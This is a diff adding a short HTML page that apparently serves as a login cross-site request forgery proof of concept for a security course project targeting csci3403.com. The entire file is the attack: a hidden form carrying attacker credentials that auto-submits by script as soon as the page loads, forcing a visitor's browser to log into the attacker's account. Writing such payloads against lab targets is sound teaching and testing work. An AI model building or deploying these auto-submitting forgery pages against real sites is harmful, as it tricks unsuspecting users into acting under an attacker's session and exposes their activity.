@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <form action="https://csci3403.com/proj3/login" method="POST" id="csrf_form1">
+            <input name="username" value="attacker">
+            <input name="password" value="l33th4x">
+        </form>
+        <script>
+            document.getElementById('csrf_form1').submit();
+        </script>
+    </body>
+</html>
